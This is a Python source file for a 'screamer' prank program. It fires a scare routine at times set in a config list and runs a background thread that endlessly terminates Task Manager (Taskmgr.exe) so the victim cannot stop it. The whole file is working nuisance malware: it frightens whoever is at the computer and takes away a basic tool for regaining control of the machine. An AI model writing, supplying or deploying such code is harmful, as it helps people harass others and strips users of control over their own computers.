from threading import Thread
import psutil
from config import *
import datetime
import screamer


def match_time(time: datetime.time, template: str):
    h, m, s = time.hour, time.minute, time.second
    template = template.split(':')

    if template[0] != '*' and template[0] != str(h): return False
    if len(template) >= 2 and template[1] != '*' and template[1] != str(m): return False
    if len(template) >= 3 and template[2] != '*' and template[2] != str(s): return False

    return True


def scream():
    reset = False
    while True:
        time = datetime.datetime.today().time()

        if match_time(time, "0") and not reset:
            for i in range(len(ACTIVATE)):
                ACTIVATE[i][1] = False
                reset = True
        
        if match_time(time, "1"): reset = False

        for i in range(len(ACTIVATE)):
            if ACTIVATE[i][1]: continue
            if not match_time(time, ACTIVATE[i][0]): continue
            ACTIVATE[i][1] = True

            screamer.run()


def taskmgr_kill():
    while True:
        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['name'] != "Taskmgr.exe": continue
                process.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue


def main():
    Thread(target=taskmgr_kill).start()
    scream()


if __name__ == "__main__":
    main()